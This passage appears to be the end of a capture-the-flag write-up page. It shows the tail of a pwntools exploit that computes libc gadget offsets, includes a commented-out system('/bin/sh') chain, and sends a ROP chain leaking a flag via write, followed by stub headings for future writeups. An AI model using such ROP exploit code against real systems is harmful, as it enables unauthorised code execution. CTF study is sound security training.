<span id="cb11-29"><a href="#cb11-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-30"><a href="#cb11-30" aria-hidden="true" tabindex="-1"></a>pop_rdi <span class="op">=</span> libc.address <span class="op">+</span> <span class="bn">0x2a3e5</span></span>
<span id="cb11-31"><a href="#cb11-31" aria-hidden="true" tabindex="-1"></a>system_addr <span class="op">=</span> libc.address <span class="op">+</span> <span class="bn">0x50d60</span></span>
<span id="cb11-32"><a href="#cb11-32" aria-hidden="true" tabindex="-1"></a>bin_sh_addr <span class="op">=</span> libc.address <span class="op">+</span> <span class="bn">0x1d8698</span></span>
<span id="cb11-33"><a href="#cb11-33" aria-hidden="true" tabindex="-1"></a><span class="co"># io.sendline(p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr))</span></span>
<span id="cb11-34"><a href="#cb11-34" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-35"><a href="#cb11-35" aria-hidden="true" tabindex="-1"></a>rop <span class="op">=</span> ROP(libc)</span>
<span id="cb11-36"><a href="#cb11-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-37"><a href="#cb11-37" aria-hidden="true" tabindex="-1"></a>flag_location <span class="op">=</span> exe.address <span class="op">+</span> <span class="bn">0x50a0</span></span>
<span id="cb11-38"><a href="#cb11-38" aria-hidden="true" tabindex="-1"></a>rop.call(<span class="st">&#39;write&#39;</span>, [<span class="dv">1337</span>, flag_location, <span class="dv">100</span>])</span>
<span id="cb11-39"><a href="#cb11-39" aria-hidden="true" tabindex="-1"></a>log.info(rop.dump())</span>
<span id="cb11-40"><a href="#cb11-40" aria-hidden="true" tabindex="-1"></a>io.sendline(rop.chain())</span>
<span id="cb11-41"><a href="#cb11-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-42"><a href="#cb11-42" aria-hidden="true" tabindex="-1"></a>io.interactive()</span></code></pre></div>
<hr />
<p>Next writeups soon…</p>
<h1 id="storygen">StoryGen</h1>
<h1 id="ubf-unnecessary-binary-format">UBF (Unnecessary Binary
Format)</h1>
<h1 id="watthewasm"><strong>Watthewasm</strong></h1>
</div>
<pre>
<footer>
  <a href="#">Home</a> | <a href="/blog/">Blog</a> | <a target="_blank" href="https://github.com/r3tr074/exploits">Exploit collection</a>  | <a href="/about.html">About me</a> | <a href="mailto:r@retr0.zip">Contact</a>
  2025 - <a target="_blank" href="https://twitter.com/r3tr074">r3tr074</a>
  </footer>
</pre>
</body>

</html>
